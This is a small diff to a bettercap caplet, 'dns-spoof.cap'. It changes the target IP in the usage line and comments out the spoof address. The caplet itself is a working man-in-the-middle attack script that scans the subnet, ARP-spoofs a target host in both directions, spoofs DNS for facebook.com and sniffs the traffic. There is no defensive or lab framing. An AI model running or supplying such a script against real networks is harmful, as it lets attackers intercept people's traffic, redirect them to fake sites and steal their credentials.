@@ -1,5 +1,5 @@
 # usage:
-# sudo ./bettercap -caplet dns-spoof.cap -eval "set arp.spoof.targets 192.168.3.2"
+# sudo bettercap -caplet dns-spoof.cap -eval "set arp.spoof.targets 192.168.3.10"
 
 # detect all devices in subnet:
 net.recon on
@@ -13,12 +13,10 @@ net.recon off
 set arp.spoof.fullduplex true
 
 set dns.spoof.domains facebook.com
-set dns.spoof.address 192.168.3.2
+#set dns.spoof.address 192.168.3.10
 set net.sniff.verbose false
 
 set net.sniff.verbose true
 net.sniff on
 dns.spoof on
 arp.spoof on
-
-
